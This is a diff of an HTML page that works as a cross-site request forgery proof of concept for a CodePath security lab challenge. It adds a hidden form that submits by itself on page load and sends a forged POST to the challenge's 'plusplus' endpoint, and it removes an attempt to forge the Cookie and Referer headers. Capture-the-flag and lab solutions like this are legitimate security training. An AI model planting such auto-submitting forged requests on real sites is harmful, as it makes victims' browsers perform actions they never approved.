@@ -6,10 +6,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>Document</title>
+    <script>function foo(){
+        document.getElementById("myForm").submit();}
+    </script>
 </head>
 
-<body>
-    <h1>Hello!</h1>
+<body onload="foo()">
+    <form name="mForm" id="myForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+        <input type="hidden" name="userid" value="183cb80b98c5db7e87c6a738f46b631ca1432ef1">
+        <input type="hidden" type="submit">
+    </form>
+
     <script>
         var xhr = new XMLHttpRequest();
         xhr.open('POST', 'https://security.codepath.com/user/csrfchallengetwo/plusplus', true);
@@ -18,10 +25,6 @@
             // do something to response
             console.log(this.responseText);
         };
-        xhr.setRequestHeader("Cookie", document.cookie);
-        xhr.setRequestHeader("Referer",
-            "https://security.codepath.com/challenges/z311736498a13604705d608fb3171ebf49bc18753b0ec34b8dff5e4f9147eb5e.jsp"
-        );
         xhr.send('userId=183cb80b98c5db7e87c6a738f46b631ca1432ef1');
     </script>
 </body>
